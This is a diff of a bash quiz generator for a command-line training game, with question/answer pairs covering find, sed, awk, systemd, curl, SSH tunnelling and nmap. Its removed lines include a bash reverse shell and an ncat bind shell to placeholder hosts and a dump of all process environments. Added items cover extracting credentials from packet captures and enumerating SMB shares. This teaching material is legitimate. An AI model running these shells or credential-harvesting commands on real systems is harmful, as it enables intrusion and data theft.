-  questions+=("Show connected WiFi info|iw dev ${wiface} link")
-  questions+=("Set WiFi channel to 6|iw dev ${wiface}mon set channel 6")
-  questions+=("Disable monitor mode|airmon-ng stop ${wiface}mon")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 19: String & Arrays
 gen_level19() {
   eval "local questions=() $_QV"; _ctx
 
@@ -2427,101 +2182,186 @@ gen_level20() {
 }
 
 # Level 30: ROOT (Apocalypse Mode)
-gen_level30() {
+gen_level21() {
   eval "local questions=() $_QV"; _ctx
+  _fpick SERVICES; local svc2=$REPLY; _frnum 2 8; local parallel=$REPLY; _frnum 1 20; local linenum=$REPLY
 
-  # === EMERGENCY RECOVERY ===
-  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
-  questions+=("Emergency single-user mode|init 1|systemctl rescue")
-  questions+=("Chroot into system mounted at /mnt|chroot /mnt /bin/bash")
-  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
-  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
-  questions+=("Fix broken sudo (as root)|chown root:root /usr/bin/sudo; chmod 4755 /usr/bin/sudo")
-  questions+=("Reset root password from recovery|passwd root")
-  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
-  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
-  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")
+  # find -exec - with flag alternatives
+  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
+  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
+  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
+  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
+  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
+  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
+  questions+=("Copy all .${ext} files to ${dir}/|find . -name '*.${ext}' -exec cp {} ${dir}/ \\;|fd -e ${ext} -x cp {} ${dir}/")
+  questions+=("Move all .${ext2} files to ${dir}/|find . -name '*.${ext2}' -exec mv {} ${dir}/ \\;|fd -e ${ext2} -x mv {} ${dir}/")
+  questions+=("Change owner of all files in ${dir}/ to ${user}|find ${dir}/ -exec chown ${user}:${user} {} \\;")
+  questions+=("Gzip all .${ext} files|find . -name '*.${ext}' -exec gzip {} \\;|fd -e ${ext} -x gzip {}")
 
-  # === HARDCORE ONE-LINERS ===
-  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
-  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
-  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
-  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
-  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
-  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
-  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
-  questions+=("Emergency disk space cleanup|find /var/log -name '*.gz' -mtime +7 -delete")
-  questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null")
-  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
+  # Batch with + (more efficient)
+  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
+  questions+=("Count total lines across all .${ext} files§find . -name '*.${ext}' -exec wc -l {} + | tail -1")
+  questions+=("Cat all .${ext} files together|find . -name '*.${ext}' -exec cat {} +")
 
-  # === NETWORK SURVIVAL ===
-  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
-  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
-  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
-  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
-  questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash")
-  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
-  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")
+  # sed replacement
+  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
+  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
+  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
+  questions+=("Delete lines ${linenum} to $((linenum + n)) from ${txt}|sed -i '${linenum},$((linenum + n))d' ${txt}")
+  questions+=("Add prefix 'LOG: ' to each line in ${W}${log}${C}|sed -i 's/^/LOG: /' ${log}")
+  questions+=("Add suffix '.bak' to each line in ${W}${txt}${C}|sed -i 's/\$/.bak/' ${txt}")
+  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
+  questions+=("Print only lines matching '${term}' in ${W}${log}${C}|sed -n '/${term}/p' ${log}")
 
-  # === SYSTEM FORENSICS ===
-  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
-  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
-  questions+=("List all users with shell access§grep -vE 'nologin|false' /etc/passwd")
-  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -iE 'failed|invalid'§grep 'Failed' /var/log/auth.log")
-  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
-  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
-  questions+=("Dump all environment variables§env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
-  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$4}' | sed 's/.*://' | xargs -I{} lsof -i:{}")
-  questions+=("Find processes with deleted binaries§ls -la /proc/*/exe 2>/dev/null | grep deleted")
-  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")
+  # xargs - building commands from stdin
+  questions+=("Delete files listed in filelist.txt|xargs rm < filelist.txt")
+  questions+=("Grep in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 grep ${term}")
+  questions+=("Count lines in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
+  questions+=("Grep in parallel (${parallel} jobs)§find . -name '*.${ext}' -print0 | xargs -0 -P ${parallel} grep ${term}")
+  questions+=("Confirm before each delete (interactive)§find . -name '*.${ext2}' -print0 | xargs -0 -p rm")
+  questions+=("Copy files in batches of ${n}§find . -name '*.${ext}' -print0 | xargs -0 -n ${n} cp -t ${dir}/")
+  questions+=("Rename files with backup_ prefix§find . -maxdepth 1 -name '*.${ext}' -printf '%f\\n' | xargs -I {} mv {} backup_{}")
+  questions+=("Preview what xargs would run (verbose/trace mode)§find . -name '*.${ext}' -print0 | xargs -0 -t wc -l")
 
-  # === DEFENSIVE HARDENING ===
-  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
-  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
-  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP")
-  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
-  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
-  questions+=("Flush all firewall rules|iptables -F; iptables -X")
-  questions+=("List all iptables rules|iptables -L -n -v")
-  questions+=("List all nftables rules|nft list ruleset")
-  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
-  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")
+  # Combined operations
+  questions+=("Find .${ext} files > ${size}, show sizes sorted§find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
+  questions+=("Replace and backup: ${old} -> ${new}, keep .bak in ${W}${cfg}${C}|sed -i.bak 's/${old}/${new}/g' ${cfg}")
+  questions+=("Find and replace recursively in ${dir}/|find ${dir}/ -type f -exec sed -i 's/${old}/${new}/g' {} \\;")
 
-  # === PROCESS NINJA ===
-  questions+=("Watch memory hogs in realtime§watch -n1 'ps aux --sort=-%mem | head -5'")
-  questions+=("Find process using open file ${W}${txt}${C}§lsof ${txt}§fuser ${txt}")
-  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
-  questions+=("Kill all processes by name|pkill -9 -f pattern")
-  questions+=("Nice a running process|renice -n 10 -p PID")
+  # Systemd service management - L19-only commands (basics covered in L12)
+  questions+=("Reload ${svc} config without restart|systemctl reload ${svc}|sudo systemctl reload ${svc}")
+  questions+=("Check if ${svc} is enabled|systemctl is-enabled ${svc}")
+  questions+=("Check if ${svc} is active|systemctl is-active ${svc}")
+  questions+=("Show ${svc} unit file|systemctl cat ${svc}")
+  questions+=("Edit ${svc} unit file override|systemctl edit ${svc}|sudo systemctl edit ${svc}")
+  questions+=("Mask ${svc} (prevent starting)|systemctl mask ${svc}|sudo systemctl mask ${svc}")
+  questions+=("Unmask ${svc}|systemctl unmask ${svc}|sudo systemctl unmask ${svc}")
 
-  # === DISK SURVIVAL ===
-  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
-  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
-  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
-  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
-  questions+=("Secure wipe ${W}${txt}${C}|shred -vfz -n 3 ${txt}")
-  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
-  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")
+  # Journalctl - L19-only commands (basics covered in L12)
+  questions+=("View last ${n2} log lines for ${svc}|journalctl -u ${svc} -n ${n2}")
+  questions+=("View kernel messages|journalctl -k|dmesg")
+  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
+  questions+=("View logs from last ${n} minutes|journalctl --since '${n} minutes ago'")
+  questions+=("View errors only|journalctl -p err|journalctl -p 3")
+  questions+=("Disk usage of journal|journalctl --disk-usage")
+  local jsize=${size/k/K}
+  questions+=("Vacuum journal to ${jsize}|journalctl --vacuum-size=${jsize}|sudo journalctl --vacuum-size=${jsize}")
+  questions+=("Output as JSON|journalctl -u ${svc} -o json")
 
-  # === PURE BASH MAGIC ===
-  questions+=("Random string generator§tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
-  questions+=("Timestamp in epoch|date +%s")
-  questions+=("Convert epoch to date|date -d @1234567890")
-  questions+=("Parallel execution with xargs§cat urls.txt | xargs -P 10 -I{} curl -s {}")
-  questions+=("Timeout a command|timeout 5 long_running_cmd")
-  questions+=("Retry command until success|until cmd; do sleep 1; done")
-  questions+=("Lock file to prevent concurrent runs§exec 200>/tmp/lock; flock -n 200 || exit 1")
-  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")
+  # Cron / crontab - scheduling
+  questions+=("Edit your crontab|crontab -e")
+  questions+=("List your cron jobs|crontab -l")
+  questions+=("Remove all your cron jobs|crontab -r")
+  questions+=("Edit root's crontab|sudo crontab -e")
+  local cron_path="/usr/local/bin/${script}"
+  questions+=("Run ${script} every 5 minutes|*/5 * * * * ${cron_path}")
+  questions+=("Run ${script} at midnight daily|0 0 * * * ${cron_path}")
+  questions+=("Run ${script} every Monday at 3am|0 3 * * 1 ${cron_path}")
+  questions+=("Run ${script} on the 1st of each month|0 0 1 * * ${cron_path}")
+  questions+=("Run ${script} every hour|0 * * * * ${cron_path}|@hourly ${cron_path}")
+  questions+=("Run ${script} at reboot|@reboot ${cron_path}")
+  questions+=("Cron: redirect output to log§*/5 * * * * ${cron_path} >> /var/log/${script%.sh}.log 2>&1")
+  questions+=("Cron: silence all output§0 * * * * ${cron_path} > /dev/null 2>&1")
 
-  # === OFFLINE/AIR-GAPPED ===
-  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
-  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
-  questions+=("Encrypt ${W}${txt}${C} for offline transport|gpg -c --cipher-algo AES256 ${txt}")
+  # === COMPOUND: Uses grep (L14), pipes (L3), logic (L6), find (L15) ===
+  questions+=("Replace '${old}' in all .${ext} files, confirm changes§find . -name '*.${ext}' -exec grep -l ${old} {} \\; | xargs sed -i 's/${old}/${new}/g'")
+  questions+=("Find .${ext} files > ${size}, print and delete§find . -name '*.${ext}' -size +${size} -print -delete")
+  questions+=("Check ${svc} status, restart if not active§systemctl is-active ${svc} || systemctl restart ${svc}")
+  questions+=("View ${svc} errors, count unique messages§journalctl -u ${svc} -p err --no-pager | sort | uniq -c | sort -rn")
+  questions+=("Find and grep all logs modified today§find /var/log -mtime 0 -type f -exec grep -l ${term} {} \\;")
 
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 23: Git
+# Level 25: Network Scanning (nmap)
+gen_level22() {
+  eval "local questions=() $_QV"; _ctx
+
+  # Regex lookahead/lookbehind (grep -P for PCRE)
+  questions+=("Match 'error' followed by number in ${W}${log}${C}|grep -P 'error(?=\\d)' ${log}")
+  questions+=("Match 'error' NOT followed by number in ${W}${log}${C}|grep -P 'error(?!\\d)' ${log}")
+  questions+=("Match number preceded by '$' in ${W}${log}${C}|grep -P '(?<=\\$)\\d+' ${log}")
+  questions+=("Match number NOT preceded by '$' in ${W}${log}${C}|grep -P '(?<!\\$)\\d+' ${log}")
+
+  # Non-greedy matching
+  questions+=("Non-greedy match between quotes in ${W}${log}${C}|grep -oP '\".*?\"' ${log}")
+  questions+=("Match shortest HTML tag in ${W}${txt}${C}|grep -oP '<.*?>' ${txt}")
+  questions+=("Extract first word after colon in ${W}${log}${C}|grep -oP ':\\s*\\K\\S+' ${log}")
+
+  # Word boundaries and anchors
+  questions+=("Match whole word 'error' only in ${W}${log}${C}|grep -w 'error' ${log}|grep -P '\\berror\\b' ${log}")
+  questions+=("Match 'error' at word boundary in ${W}${log}${C}|grep -P '\\berror' ${log}")
+  questions+=("Match lines starting with digit in ${W}${txt}${C}|grep '^[0-9]' ${txt}")
+  questions+=("Match lines ending with digit in ${W}${txt}${C}|grep '[0-9]$' ${txt}")
+  questions+=("Match empty lines in ${W}${txt}${C}|grep '^$' ${txt}")
+
+  # Character classes
+  questions+=("Match any vowel in ${W}${txt}${C}|grep '[aeiou]' ${txt}")
+  questions+=("Match non-digit in ${W}${txt}${C}|grep '[^0-9]' ${txt}")
+  questions+=("Match word character in ${W}${txt}${C}|grep -P '\\w' ${txt}")
+  questions+=("Match whitespace in ${W}${txt}${C}|grep -P '\\s' ${txt}")
+  questions+=("Match hex character in ${W}${txt}${C}|grep '[0-9a-fA-F]' ${txt}")
+
+  # Quantifiers
+  questions+=("Match exactly ${n} digits in ${W}${log}${C}|grep -E '[0-9]{${n}}' ${log}")
+  questions+=("Match ${n} or more digits in ${W}${log}${C}|grep -E '[0-9]{${n},}' ${log}")
+  questions+=("Match 2 to ${n} digits in ${W}${log}${C}|grep -E '[0-9]{2,${n}}' ${log}")
+  questions+=("Match optional 's' (plurals) in ${W}${log}${C}|grep -E 'errors?' ${log}")
+
+  # Groups and backreferences
+  questions+=("Match repeated word in ${W}${txt}${C}|grep -P '\\b(\\w+)\\s+\\1\\b' ${txt}")
+  questions+=("Match repeated character in ${W}${txt}${C}|grep -E '(.)\\1' ${txt}")
+  questions+=("Capture and replace with sed in ${W}${log}${C}|sed -E 's/(error):\\s*(.*)/\\2 [\\1]/' ${log}")
+  questions+=("Swap two words in ${W}${txt}${C}|sed -E 's/(\\w+)\\s+(\\w+)/\\2 \\1/' ${txt}")
+
+  # Advanced sed
+  questions+=("Delete lines matching pattern in ${W}${txt}${C}|sed '/pattern/d' ${txt}")
+  questions+=("Print only lines matching in ${W}${txt}${C}|sed -n '/pattern/p' ${txt}")
+  questions+=("Replace only on lines matching in ${W}${log}${C}|sed '/error/s/foo/bar/g' ${log}")
+  questions+=("Insert line before match in ${W}${txt}${C}|sed '/pattern/i inserted line' ${txt}")
+  questions+=("Insert line after match in ${W}${txt}${C}|sed '/pattern/a inserted line' ${txt}")
+  questions+=("Change entire matching line in ${W}${txt}${C}|sed '/pattern/c replacement line' ${txt}")
+  questions+=("Multiple sed commands in ${W}${txt}${C}|sed -e 's/a/b/' -e 's/c/d/' ${txt}")
+  questions+=("Sed with address range in ${W}${txt}${C}|sed '5,10s/old/new/g' ${txt}")
+  questions+=("Delete from line 5 to pattern in ${W}${txt}${C}|sed '5,/pattern/d' ${txt}")
+  questions+=("Transform case (lowercase) in ${W}${txt}${C}|sed 's/.*/\\L&/' ${txt}")
+  questions+=("Transform case (uppercase) in ${W}${txt}${C}|sed 's/.*/\\U&/' ${txt}")
+  questions+=("Capitalize first letter in ${W}${txt}${C}|sed 's/.*/\\u&/' ${txt}")
+
+  # Advanced awk
+  questions+=("Print lines where id > value in ${W}data.csv${C}|awk -F',' '\$1 > 100' data.csv")
+  questions+=("Print unique values from column in ${W}${csv}${C}|awk -F',' '!seen[\$1]++' ${csv}")
+  questions+=("Sum id column in ${W}data.csv${C} (skip header)|awk -F',' 'NR>1{sum+=\$1} END{print sum}' data.csv")
+  questions+=("Average of id column in ${W}data.csv${C} (skip header)|awk -F',' 'NR>1{sum+=\$1; n++} END{print sum/n}' data.csv")
+  questions+=("Find max id (skip header) in ${W}data.csv${C}|awk -F',' 'NR==2{max=\$1} NR>1 && \$1>max{max=\$1} END{print max}' data.csv")
+  questions+=("Find min id (skip header) in ${W}data.csv${C}|awk -F',' 'NR==2{min=\$1} NR>1 && \$1<min{min=\$1} END{print min}' data.csv")
+  questions+=("Group by and count in ${W}${csv}${C}|awk -F',' '{count[\$1]++} END{for(k in count) print k, count[k]}' ${csv}")
+  questions+=("Conditional print in ${W}${csv}${C}|awk -F',' '\$3==\"active\" {print \$1, \$2}' ${csv}")
+  questions+=("Print with custom separator in ${W}${csv}${C}§awk -F',' 'BEGIN{OFS=\"|\"} {print \$1,\$2}' ${csv}")
+  questions+=("String functions: length in ${W}${txt}${C}|awk '{print length(\$0)}' ${txt}")
+  questions+=("String functions: substr in ${W}${txt}${C}|awk '{print substr(\$0,1,10)}' ${txt}")
+  questions+=("String functions: gsub in ${W}${txt}${C}|awk '{gsub(/old/,\"new\"); print}' ${txt}")
+  questions+=("String functions: split in ${W}${txt}${C}|awk '{n=split(\$0,a,\":\"); print a[1]}' ${txt}")
+  questions+=("Pattern range in ${W}${txt}${C}|awk '/start/,/end/' ${txt}")
+  questions+=("Print line numbers in ${W}${txt}${C}|awk '{print NR\": \"\$0}' ${txt}")
+  questions+=("Skip header line in ${W}${csv}${C}|awk 'NR>1' ${csv}")
+  questions+=("Print every nth line in ${W}${txt}${C}|awk 'NR%${n}==0' ${txt}")
+  questions+=("Reverse fields in ${W}${txt}${C}|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")
+
+  # Combining tools
+  questions+=("Complex: extract, sort, count in ${W}${log}${C}§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
+  questions+=("Complex: top N by frequency in ${W}${log}${C}§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
+  questions+=("Complex: join lines with comma in ${W}${txt}${C}|paste -sd',' ${txt}")
+
+  # Process substitution - advanced piping
+  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
+  questions+=("Compare output of two commands|diff <(cmd1) <(cmd2)")
+  questions+=("Feed ${W}${log}${C} as input to program (process substitution)|wc -l <(grep pattern ${log})")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 14: System Admin
 gen_level23() {
   eval "local questions=() $_QV"; _ctx
 
@@ -2619,59 +2459,286 @@ gen_level23() {
 }
 
 # Level 15: Multiplexers (tmux)
-gen_level15() {
+gen_level24() {
   eval "local questions=() $_QV"; _ctx
+  local key=data  # export.json only has .data array
 
-  # Session management (CLI)
-  questions+=("Start new tmux session|tmux|tmux new")
-  questions+=("Start tmux session named 'work'|tmux new -s work|tmux new-session -s work")
-  questions+=("List sessions|tmux ls|tmux list-sessions")
-  questions+=("Attach to last session|tmux attach|tmux a")
-  questions+=("Attach to session 'work'|tmux attach -t work|tmux a -t work")
-  questions+=("Kill session 'work'|tmux kill-session -t work")
-  questions+=("Kill tmux server (all sessions)|tmux kill-server")
-  questions+=("Rename session 'work' to 'dev'|tmux rename-session -t work dev")
+  # tshark - packet capture & analysis
+  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
+  questions+=("Capture only 100 packets to ${W}${pcap}${C}|tshark -i ${iface} -c 100 -w ${pcap}")
+  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
+  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
+  questions+=("Filter traffic to/from ${ip} in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
+  questions+=("Show DNS queries in ${W}${pcap}${C}|tshark -r ${pcap} -Y dns|tshark -r ${pcap} -Y 'dns.qry.name'")
+  questions+=("Extract HTTP POST data in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
+  questions+=("Extract all URLs from ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
+  questions+=("Show TCP conversations in ${W}${pcap}${C}|tshark -r ${pcap} -q -z conv,tcp")
+  questions+=("Extract credentials (FTP, HTTP basic) in ${W}${pcap}${C}§tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")
 
-  # Window management (CLI)
-  questions+=("Create new window in session|tmux new-window|tmux neww")
-  questions+=("Create named window 'logs'|tmux new-window -n logs")
-  questions+=("Split pane left/right|tmux split-window -h")
-  questions+=("Split pane top/bottom|tmux split-window -v")
-  questions+=("List all windows|tmux list-windows")
-  questions+=("Select window 0|tmux select-window -t 0")
-  questions+=("Swap current window with window 0|tmux swap-window -t 0")
+  # jq - JSON processing
+  questions+=("Pretty print JSON file|jq '.' data/export.json")
+  questions+=("Extract '${key}' array from JSON|jq '.${key}' data/export.json")
+  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data/export.json")
+  questions+=("Extract 'name' field from each item§jq '.${key}[] | .name' data/export.json")
+  questions+=("Filter items where status is 'active'§jq '.${key}[] | select(.status == \"active\")' data/export.json")
+  questions+=("Count items in array§jq '.${key} | length' data/export.json")
+  questions+=("Get keys of JSON object|jq 'keys' data/export.json")
+  questions+=("Compact JSON (remove whitespace)|jq -c '.' data/export.json")
+  questions+=("Create new object from fields§jq '.${key}[] | {name: .name, id: .id}' data/export.json")
+  questions+=("Fetch ${url}/api and extract '${key}' array with ${Y}jq${C}§curl -s ${url}/api | jq '.${key}'")
 
-  # Pane management (CLI)
-  questions+=("List all panes|tmux list-panes")
-  questions+=("Select pane to the right|tmux select-pane -R")
-  questions+=("Select pane below|tmux select-pane -D")
-  questions+=("Zoom/unzoom pane|tmux resize-pane -Z")
-  questions+=("Kill current pane|tmux kill-pane")
-  questions+=("Resize pane down by 10 lines|tmux resize-pane -D 10")
-  questions+=("Resize pane right by 20 columns|tmux resize-pane -R 20")
-  questions+=("Swap with next pane|tmux swap-pane -D")
+  # curl - HTTP client
+  questions+=("GET request to ${url}|curl ${url}")
+  questions+=("GET request with headers shown|curl -i ${url}")
+  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
+  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
+  questions+=("Follow redirects|curl -L ${url}")
+  questions+=("Save output to file|curl -o output.html ${url}")
+  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
+  questions+=("Silent mode (no progress)|curl -s ${url}")
+  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")
 
-  # Scripting / automation (the real power)
-  questions+=("Send keys to session 'work'|tmux send-keys -t work 'ls -la' Enter")
-  questions+=("Capture pane output to stdout|tmux capture-pane -p")
-  questions+=("Save pane output to file§tmux capture-pane -p > output.txt")
-  questions+=("Run command in new window§tmux new-window 'htop'")
-  questions+=("Create session with command§tmux new -s monitor 'htop'")
-  questions+=("Pipe pane output to log file|tmux pipe-pane -t work 'cat >> session.log'")
+  # SSH tunneling (CRITICAL for pentesting)
+  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
+  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
+  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
+  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
+  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
+  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
+  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
+  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")
 
-  # Essential keybindings (recall, not drills)
-  questions+=("Keybinding: detach from session|Ctrl+b d")
-  questions+=("Keybinding: split pane horizontally|Ctrl+b %")
-  questions+=("Keybinding: split pane vertically|Ctrl+b \"")
-  questions+=("Keybinding: cycle to next pane|Ctrl+b o")
-  questions+=("Keybinding: toggle pane zoom|Ctrl+b z")
-  questions+=("Keybinding: enter copy mode|Ctrl+b [")
-  questions+=("Keybinding: show all keybindings|Ctrl+b ?")
+  # wget
+  questions+=("Download file|wget ${url}/file.tar.gz")
+  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
+  questions+=("Mirror website for offline|wget -mk ${url}")
+
+  # OpenSSL (cert checking, encryption)
+  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
+  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
+  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -pbkdf2 -salt -in file.txt -out file.enc")
+  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt")
+  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")
+
+  # SMB/NetBIOS
+  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
+  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
+  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")
 
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 29: Privilege Escalation
+# Level 26: WiFi & RF
+gen_level25() {
+  eval "local questions=() $_QV"; _ctx
+  port2=$((port + 1000))
+
+  # Basic scans
+  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
+  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
+  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
+  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
+  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")
+
+  # Service/version detection
+  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
+  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
+  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
+  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
+  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")
+
+  # Scan types
+  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
+  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
+  questions+=("TCP SYN scan on ${ip} (half-open)|nmap -sS ${ip}")
+  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")
+
+  # Network discovery
+  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
+  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
+  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")
+
+  # Output formats
+  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
+  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")
+
+  # Scripts
+  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
+  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
+  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
+  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
